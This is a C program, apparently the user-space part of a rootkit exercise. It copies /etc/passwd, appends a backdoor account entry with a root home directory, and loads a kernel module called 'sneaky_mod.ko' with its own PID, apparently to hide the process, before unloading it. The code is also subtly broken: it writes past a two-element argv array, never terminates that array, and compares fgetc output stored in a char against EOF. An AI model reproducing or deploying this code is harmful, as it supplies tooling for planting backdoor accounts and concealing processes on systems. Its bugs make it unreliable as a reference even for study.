#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>
int copyfile();
int run_sub_process();
int main() {
  pid_t pid = getpid();
  char pid_arr[10];
  sprintf(pid_arr, "pid=%d", pid);
  printf("sneaky_process pid = %d\n", pid);
  printf("%s\n", pid_arr);
  if (copyfile() == -1) {
    printf("failed to copy file\n");
    return EXIT_FAILURE;
  }
  char **argv = malloc(2 * sizeof(char *));
  argv[0] = "/sbin/insmod";
  argv[1] = "sneaky_mod.ko";
  argv[2] = pid_arr;
  if (run_sub_process(argv) == -1) {
    printf("failed to load module\n");
    return EXIT_FAILURE;
  }
  argv[0] = "/sbin/rmmod";
  argv[2] = NULL;
  if (run_sub_process(argv) == -1) {
    printf("failed to remove module\n");
    return EXIT_FAILURE;
  }
  free(argv);

  return EXIT_SUCCESS;
}
int copyfile() {
  char *newline = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
  FILE *src = fopen("/etc/passwd", "r");
  if (src == NULL)
    return -1;
  FILE *dst = fopen("/tmp/passwd", "w");
  if (dst == NULL)
    return -1;
  char c = fgetc(src);
  while (c != EOF) {
    fputc(c, dst);
    c = fgetc(src);
  }
  fprintf(dst, "%s", newline);
  fclose(src);
  fclose(dst);
  return 0;
}
int run_sub_process(char **argv) {
  pid_t cpid;
  int status;
  if ((cpid = fork()) == 0) { /* Code executed by child */
    execv(argv[0], argv);
    return EXIT_SUCCESS;
  } else { /* Code executed by parent */
    do {
      if (waitpid(cpid, &status, WUNTRACED | WCONTINUED) == -1) {
        perror("waitpid");
        return -1;
      }
    } while (!WIFEXITED(status) && !WIFSIGNALED(status));
  }
  return 0;
}
